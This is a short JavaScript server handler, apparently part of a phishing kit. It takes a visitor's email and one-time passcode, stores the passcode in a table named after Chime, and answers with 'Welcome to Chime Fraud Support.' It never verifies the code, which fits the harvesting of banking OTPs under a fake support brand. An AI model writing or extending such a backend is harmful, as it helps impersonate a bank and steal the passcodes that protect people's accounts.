import prisma from "../taskJob/auth/prisma.js";

// main signup handler
export const step2 = async (req, res) => {
 const { email, otp } = req.validated.body;
 
   try {
     // create  new
     await prisma.chime.update({
       where: { email },
       data: { otp },
     });
 
     return res.status(200).json({
       success: true,
       message: "Welcome to Chime Fraud Support.",
     });

   } catch (error) {
     //log error activity
     await prisma.caseactivity.create({
       data: {
         email,
         message: error.message,
       },
     });
 
     return res.status(500).json({
       success: false,
       message: "Something went wrong please try again",
     });
   }
};
